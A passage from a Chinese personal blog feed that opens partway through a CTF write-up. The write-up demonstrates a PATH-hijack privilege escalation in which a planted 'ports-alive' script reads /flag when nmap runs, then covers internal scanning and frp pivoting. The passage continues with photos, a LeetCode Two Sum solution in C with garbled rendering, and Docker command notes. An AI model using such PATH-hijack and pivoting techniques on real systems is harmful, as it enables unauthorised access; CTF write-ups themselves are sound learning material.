class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ echo $PATH</span><br><span class="line">echo $PATH</span><br><span class="line">/sbin:/usr/sbin:/bin:/usr/bin</span><br><span class="line"></span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p>写入ports-alive</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ cat &lt;&lt; EOF &gt; ports-alive</span><br><span class="line">cat &lt;&lt; EOF &gt; ports-alive</span><br><span class="line">&gt; #!/bin/sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">&gt; cat /flag</span><br><span class="line">cat /flag</span><br><span class="line">&gt; EOF</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>注意还要执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -h</span><br><span class="line">sh: ports-alive: Permission denied</span><br><span class="line">/tmp $ chmod 777 ports-alive</span><br><span class="line">chmod 777 ports-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 &#x2F;tmp 目录执行 nmap -h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ nmap -h</span><br><span class="line">nmap -h</span><br><span class="line">假作真时真亦假,真作假时假亦真</span><br><span class="line">flag&#123;Everything_is_illusory&#125;</span><br></pre></td></tr></table></figure><h2 id="独步天下-破除虚妄-探见真实"><a href="#独步天下-破除虚妄-探见真实" class="headerlink" title="独步天下-破除虚妄_探见真实"></a><strong>独步天下-破除虚妄_探见真实</strong></h2><p>接上一题的环境</p><p>Hint <code>ports-alive 修正后扫描网段 （ip范围0到100）用基础get包探测获取html echo -e &quot;GET / HTTP/1.1\\r\\nHost: 192.168.200.1\\r\\n\\r\\n&quot; nc xx xx</code></p><p>可以出网，刚开始想上传一个fscan扫描，结果扫出一个80端口然后内存不够fscan被杀了，就只能根据提示，修正nmap扫描。</p><p>先查看ip：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ ip a</span><br><span class="line">ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.200.2/24 brd 192.168.200.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe12:3456/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop qlen 1000</span><br><span class="line">    link/sit 0.0.0.0 brd 0.0.0.0</span><br></pre></td></tr></table></figure><p>扫描 192.168.200.2&#x2F;24 网段</p><p>发现一个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.1:82</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>82 部署了一个上传服务，frp出来看看</p><hr><p>后续有空再更新。。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭州</title>
      <link href="/2023/08/23/%E6%9D%AD%E5%B7%9E/"/>
      <url>/2023/08/23/%E6%9D%AD%E5%B7%9E/</url>
      
        <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/8E995D92D9E7DBF8AC4FD92A83A0885E.jpg" alt="8E995D92D9E7DBF8AC4FD92A83A0885E" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/2C837E6D0AC5EEEF43EC600073D8A711.jpg" alt="2C837E6D0AC5EEEF43EC600073D8A711" style="zoom:33%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> 摄影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode第一题-C语言实现</title>
      <link href="/2023/08/18/leetcode%E7%AC%AC%E4%B8%80%E9%A2%98-c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/08/18/leetcode%E7%AC%AC%E4%B8%80%E9%A2%98-c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>写了两个版本，一个数组一个哈希表。哈希表确实效率高，时间空间都是，不过空间上还是做的不够好，应该是我设计的问题，数组表可能没有链表好吧。</p><p>结果：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230818224555023-1024x214.png"></p><h3 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1_两数之和"></a>1_两数之和</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>给一个数组和一个target，要求返回数组的两个下标，使得两下标对应的数之和为target</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><h5 id="简单算法："><a href="#简单算法：" class="headerlink" title="简单算法："></a>简单算法：</h5><ul><li>直接两个指针，进行移动查找。<ul><li>时间复杂度是 n(n-1)&#x3D;&gt;n^2</li></ul></li><li>先顺序排序，然后设置两个指针依次比大小，从最小的两个数之和开始，然后依次右移<ul><li>如果刚开始小了右移之后大了，说明没有这样的解。不不不，顺序查找可以二分法。</li><li>如果到最后都一直小，说明没有这样的解</li><li>时间复杂度是：刚开始的顺序排序–一般都是n^2 + 查找–一般 n^2</li></ul></li></ul><h4 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * Note: The returned array must be malloced, assume caller calls free().  </span></span><br><span class="line"><span class="comment">  **/</span>  </span><br><span class="line"> <span class="type">int</span>\* twoSum(<span class="type">int</span>\* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>\* returnSize)&#123;  </span><br><span class="line">   \*returnSize = <span class="number">2</span>;  </span><br><span class="line">   <span class="type">int</span>\* result = (<span class="type">int</span>\*)<span class="built_in">malloc</span>(<span class="number">2</span>\*<span class="keyword">sizeof</span>(<span class="type">int</span>));  </span><br><span class="line">   <span class="type">int</span> m,n;  </span><br><span class="line">   <span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;numsSize<span class="number">-1</span>;m++)&#123;  </span><br><span class="line">     <span class="keyword">for</span>(n=m+<span class="number">1</span>;n&lt;=numsSize<span class="number">-1</span>;n++)&#123;  </span><br><span class="line">       <span class="keyword">if</span>(nums\[m\]+nums\[n\]==target)&#123;  </span><br><span class="line">         result\[<span class="number">0</span>\]=m;  </span><br><span class="line">         result\[<span class="number">1</span>\]=n;  </span><br><span class="line">         <span class="keyword">return</span> result;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">   <span class="built_in">free</span>(result);  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="comment">/**int main()&#123;  </span></span><br><span class="line"><span class="comment">     int nums\[\] = &#123;2, 7, 11,15&#125;;  </span></span><br><span class="line"><span class="comment">     int target = 9;  </span></span><br><span class="line"><span class="comment">     int numsSize = sizeof(nums) / sizeof(nums\[0\]);  </span></span><br><span class="line"><span class="comment">     int returnSize = 2;  </span></span><br><span class="line"><span class="comment">     int * result = twoSum(nums, numsSize, target, &amp;returnSize);  </span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">     printf(&quot;%d,%d&quot;,result\[0\],result\[1\]);  </span></span><br><span class="line"><span class="comment">     free(result);  </span></span><br><span class="line"><span class="comment">     return 0;  </span></span><br><span class="line"><span class="comment"> &#125;**/</span></span><br></pre></td></tr></table></figure><h4 id="补充-HashMap"><a href="#补充-HashMap" class="headerlink" title="补充-HashMap"></a>补充-HashMap</h4><p>哈希函数的写法有很多中，我们来看看<strong>「HashMap」</strong>中的哈希函数<strong>[java]</strong>     </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> final <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;    </span><br><span class="line"><span class="type">int</span> h;  </span><br><span class="line">    <span class="keyword">return</span> (key == null) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>「HashMap」</strong>中利用了<strong>「hashCode」</strong>来完成这个转换。哈希函数不管怎么实现，都应该满足下面三个基本条件：</p><ul><li>散列函数计算得到的散列值是一个非负整数</li><li>如果 key1 &#x3D; key2，那 hash(key1) &#x3D;&#x3D; hash(key2)</li><li>如果 key1 ≠ key2，那 hash(key1) ≠ hash(key2)</li></ul><p>第一点：因为数组的下标是从0开始，所以哈希函数生成的哈希值也应该是非负数</p><p>第二点：同一个key生成的哈希值应该是一样的，因为我们需要通过key查找哈希表中的数据</p><p>第三点：看起来非常合理，但是两个不一样的值通过哈希函数之后可能才生相同的值，因为我们把巨大的空间转出成较小的数组空间时，不能保证每个数字都映射到数组空白处。所以这里就会才生冲突，在哈希表中我们称之为哈希冲突。我们常用解决哈希冲突的方法有两种<strong>「开放地址法」</strong>和<strong>「链表法」</strong></p><p>总的来说hashmap就是可以实现一次查找，对于这道题，我们借助hashmap就可以实现在线性时间内找到答案。</p><h6 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h6><p>遍历数组时，我们可以检查目标值与当前数字的差是否已经在哈希表中存在，如果存在，说明我们已经找到了两个数的和等于目标值。</p><p>这样，我们只需要最多把所有num遍历一遍，就可以出结果。</p><h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><ul><li>需要把数字的值和下标都存到hash表中</li><li>然后从第一个开始找，找到了就返回该数字下标和那个差的下标</li></ul><hr><p>上面的还是不太好，下面是网上图解</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230818151848875-1-1024x593.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230818151905417-1-1024x633.png"></p><h6 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h6><figure class="highlight c"><figcaption><span>​ ​</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;  </span><br><span class="line"></span><br><span class="line">include &lt;stdlib.h&gt;  </span><br><span class="line"></span><br><span class="line">define HashSize <span class="number">20000</span>  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>  </span><br><span class="line">     <span class="type">int</span> key;  </span><br><span class="line">     <span class="type">int</span> value;  </span><br><span class="line">     <span class="type">int</span> used;  </span><br><span class="line"> &#125; HashEntry;  </span><br><span class="line"> ​  </span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>  </span><br><span class="line">     HashEntry\* data;  </span><br><span class="line">     <span class="type">int</span> size;    <span class="comment">//hashbiao长度  </span></span><br><span class="line"> &#125; HashMap;  </span><br><span class="line"> HashMap\* createHashMap(<span class="type">int</span> size) &#123;  </span><br><span class="line">     HashMap\* <span class="built_in">map</span> = (HashMap\*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(HashMap));  </span><br><span class="line">     <span class="built_in">map</span>-&gt;data = (HashEntry\*)<span class="built_in">calloc</span>(size, <span class="keyword">sizeof</span>(HashEntry));  </span><br><span class="line">     <span class="built_in">map</span>-&gt;size = size;  </span><br><span class="line">     <span class="comment">//for (int i = 0; i &lt; size; i++) &#123;  </span></span><br><span class="line">     <span class="comment">//   map-&gt;data\[i\].used = 0; // 初始化为未使用  </span></span><br><span class="line">     <span class="comment">//&#125;  </span></span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">map</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="type">void</span> <span class="title function_">insert</span><span class="params">(HashMap\* <span class="built_in">map</span>, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;  </span><br><span class="line">     <span class="type">int</span> hash = <span class="built_in">abs</span>(value) % <span class="built_in">map</span>-&gt;size;  </span><br><span class="line">     <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data\[hash\].used <span class="built_in">map</span>-&gt;data\[hash\].value != <span class="number">0</span>) &#123;  </span><br><span class="line">         hash = <span class="built_in">abs</span>(hash + <span class="number">1</span>) % <span class="built_in">map</span>-&gt;size;  </span><br><span class="line">    &#125;  </span><br><span class="line">     <span class="built_in">map</span>-&gt;data\[hash\].key = key;  </span><br><span class="line">     <span class="built_in">map</span>-&gt;data\[hash\].value = value;  </span><br><span class="line">     <span class="built_in">map</span>-&gt;data\[hash\].used = <span class="number">1</span>; <span class="comment">// 标记为已使用  </span></span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="type">int</span>\* twoSum(<span class="type">int</span>\* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>\* returnSize) &#123;  </span><br><span class="line"></span><br><span class="line">     HashMap\* <span class="built_in">map</span> = createHashMap(HashSize);  </span><br><span class="line"> ​  </span><br><span class="line">     <span class="type">int</span>\* result = (<span class="type">int</span>\*)<span class="built_in">malloc</span>(<span class="number">2</span> \* <span class="keyword">sizeof</span>(<span class="type">int</span>));  </span><br><span class="line">     \*returnSize = <span class="number">2</span>;  </span><br><span class="line">     <span class="type">int</span> i;  </span><br><span class="line">     <span class="type">int</span> hash;  </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; numsSize; i++) &#123;  </span><br><span class="line">         <span class="type">int</span> complement = target - nums\[i\];  </span><br><span class="line"></span><br><span class="line">         hash = <span class="built_in">abs</span>(complement) % HashSize;  </span><br><span class="line"> ​  </span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data\[hash\].used <span class="built_in">map</span>-&gt;data\[hash\].value != <span class="number">0</span>) &#123;  </span><br><span class="line">             <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data\[hash\].value != complement) &#123;  </span><br><span class="line"></span><br><span class="line">                 hash = (hash + <span class="number">1</span>) % HashSize;  </span><br><span class="line">                 <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;data\[hash\].used ==<span class="number">0</span>) &amp;&amp; (<span class="built_in">map</span>-&gt;data\[hash\].value == <span class="number">0</span>)) &#123;  </span><br><span class="line">                     insert(<span class="built_in">map</span>, i, nums\[i\]);  </span><br><span class="line">                     <span class="keyword">break</span>;  <span class="comment">// 插入后跳出循环  </span></span><br><span class="line">                &#125;  </span><br><span class="line">                 <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data\[hash\].value == complement) &#123;  </span><br><span class="line">                     result\[<span class="number">0</span>\] = i;  </span><br><span class="line">                     result\[<span class="number">1</span>\] = <span class="built_in">map</span>-&gt;data\[hash\].key;  </span><br><span class="line">                     <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  </span><br><span class="line">                     <span class="built_in">free</span>(<span class="built_in">map</span>);  </span><br><span class="line">                     <span class="keyword">return</span> result;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">             <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data\[hash\].value == complement) &#123;  </span><br><span class="line">                 result\[<span class="number">0</span>\] = i;  </span><br><span class="line">                 result\[<span class="number">1</span>\] = <span class="built_in">map</span>-&gt;data\[hash\].key;  </span><br><span class="line">                 <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  </span><br><span class="line">                 <span class="built_in">free</span>(<span class="built_in">map</span>);  </span><br><span class="line">                 <span class="keyword">return</span> result;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">         <span class="keyword">else</span> &#123;  </span><br><span class="line">             insert(<span class="built_in">map</span>, i, nums\[i\]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"> ​  </span><br><span class="line">     <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  </span><br><span class="line">     <span class="built_in">free</span>(<span class="built_in">map</span>);  </span><br><span class="line">     <span class="keyword">return</span> result;  </span><br><span class="line">     <span class="comment">//free(result);  </span></span><br><span class="line"> &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>人麻了。。</p><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><ul><li>注意hash表的判断逻辑，初始化0和赋值为0注意区分，需要一个used判断符号来判断</li><li>优化的话hash表用链表，也许可以优化空间？</li><li>C语言写算法太鸡肋了，赶快换语言！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 课内 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课内 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/07/25/docker/"/>
      <url>/2023/07/25/docker/</url>
      
        <content type="html"><![CDATA[<h3 id="Docker学习路线"><a href="#Docker学习路线" class="headerlink" title="Docker学习路线"></a>Docker学习路线</h3><ul><li>Docker概述</li><li>Docker安装</li><li>Docker命令</li><li>镜像命令</li><li>容器命令</li><li>操作命令</li><li>···</li><li>Docker镜像</li><li>容器数据卷</li><li>DockerFile</li><li>Docker网络原理</li><li>IDEA整合Docker</li><li>Docker Compose</li><li>Docker Swarm</li></ul><h3 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h3><h5 id="Docker能干嘛"><a href="#Docker能干嘛" class="headerlink" title="Docker能干嘛"></a>Docker能干嘛</h5><p>虚拟机技术缺点：</p><ul><li>资源占用非常多</li><li>冗余步骤多</li><li>启动慢</li></ul><p>容器化技术：</p><ul><li><strong>不是模拟的一个完整的操作系统</strong></li><li>传统虚拟机，虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件，而容器技术，是把应用直接运行在宿主机上，容器是没有自己的内核的，也没有虚拟硬件</li><li>每个容器之间相互隔离，每个容器之间都有属于自己的文件系统，互不影响。</li></ul><h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><h5 id="Docker的基本组成"><a href="#Docker的基本组成" class="headerlink" title="Docker的基本组成"></a>Docker的基本组成</h5><p><img src="http://psych.green/wp-content/uploads/2023/07/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230725163531-1024x529.png"></p><p>客户端-服务器-仓库</p><h6 id="镜像-image"><a href="#镜像-image" class="headerlink" title="镜像(image)"></a>镜像(image)</h6><p>Docker镜像好比一个模板，可以通过这个模板来创建容器服务，比如Tomcat镜像&#x3D;》run&#x3D;》Tomcat容器。通过一个镜像可以创建多个容器，而最终的服务项目是运行在容器中的。</p><h6 id="容器-container"><a href="#容器-container" class="headerlink" title="容器(container)"></a>容器(container)</h6><p>Docker利用容器技术，独立运行一个或者一组应用，通过镜像来创建。容器可以启动，停止，删除等。目前可以把容器理解为一个简易的linux系统。</p><h6 id="仓库-repository"><a href="#仓库-repository" class="headerlink" title="仓库(repository)"></a>仓库(repository)</h6><p>Docker仓库就是存放镜像的地方，仓库分为共有仓库和私有仓库。Docker hub，阿里云···都有容器服务器(配置镜像加速)。</p><h6 id="Docker底层原理"><a href="#Docker底层原理" class="headerlink" title="Docker底层原理"></a>Docker底层原理</h6><p>Docker是一个client-server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p><p>DockerSever 接收到Docker–Client的指令，就会执行这个命令。</p><h3 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h3><hr><h5 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version       #显示docker的版本信息</span><br><span class="line">docker info          #显示docker的系统信息，包括容器和镜像的数量</span><br><span class="line">docker 命令 --help   #帮助命令</span><br></pre></td></tr></table></figure><p>帮助文档的地址: <a href="https://docs.docker.com/engine/reference/">https://docs.docker.com/engine/reference/</a> 右侧的command-line</p><h5 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h5><hr><p><code>docker images</code> 查看所有本地主机上的镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#可选项：</span><br><span class="line">-a --all     #列出所有的镜像</span><br><span class="line">-q --quiet   #只显示镜像的id</span><br></pre></td></tr></table></figure><p><code>docker search</code> 搜索镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#可选项，通过隐藏来过滤</span><br><span class="line">--filter=STARS=3000     #搜索出来的镜像就是STARS大于3000的，也就是下载量比较高的镜像了</span><br></pre></td></tr></table></figure><p><code>docker pull</code> 下载镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名[:tag]</span><br><span class="line">如果不加tag就是，默认下载最新版本，latest</span><br><span class="line">#指定版本下载: docker pull mysql:5.7    ---注意这个版本一定是docker hub里面写支持了，不是自己想写什么什么</span><br><span class="line"></span><br><span class="line">#下载是分层下载，这是docker image的核心 联合文件系统</span><br></pre></td></tr></table></figure><p><code>docker rmi</code> 删除镜像 –这个i就是指的images，所以是删除镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#全部删除：</span><br><span class="line">docker rmi -f $(docker images -aq)    #后面返回所有的images的ID</span><br></pre></td></tr></table></figure><h5 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h5><hr><p>说明：有了镜像才会有容器，以centos为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><h6 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a>新建容器并启动</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line">#参数说明</span><br><span class="line">--name=&#x27;NAME&#x27;         容器名字 </span><br><span class="line">-d                    后台方式运行</span><br><span class="line">-P                    指定容器的端口</span><br><span class="line">   -P   ip:主机端口:容器端口</span><br><span class="line">   -P   主机端口:容器端口</span><br><span class="line">   容器端口</span><br><span class="line">-p                    随机制定端口</span><br><span class="line"></span><br><span class="line">#测试  启动并进入容器</span><br><span class="line">&gt;docker run -it centos /bin/bash</span><br></pre></td></tr></table></figure><h6 id="列出所有运行的容器"><a href="#列出所有运行的容器" class="headerlink" title="列出所有运行的容器"></a>列出所有运行的容器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps   </span><br><span class="line">-a              #列出当前正在运行的所有容器+带出历史运行过的容器</span><br><span class="line">-n=numbers      #显示最近创建的几个容器</span><br><span class="line">-q              #只显示容器编号</span><br></pre></td></tr></table></figure><h6 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit          #容器停止并退出</span><br><span class="line">Ctrl +P+Q     #容器不停止退出</span><br></pre></td></tr></table></figure><h6 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker rm    #没有加i说明不是image，就是容器了</span><br><span class="line">#只rm不能删除正在运行的容器，如果要删除正在运行的，需要：</span><br><span class="line">docker rm  -f</span><br><span class="line">docker rm -f $(docker ps -aq)</span><br></pre></td></tr></table></figure><h6 id="启动-停止容器"><a href="#启动-停止容器" class="headerlink" title="启动&#x2F;停止容器"></a>启动&#x2F;停止容器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器ID       #启动容器</span><br><span class="line">docker stop  容器ID       #停止当前正在运行的容器</span><br><span class="line">docker restart  容器ID    #重启容器</span><br><span class="line">docker kill 容器ID        #强制停止当前容器</span><br></pre></td></tr></table></figure><h5 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h5><hr><h6 id="后台启动容器"><a href="#后台启动容器" class="headerlink" title="后台启动容器"></a>后台启动容器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 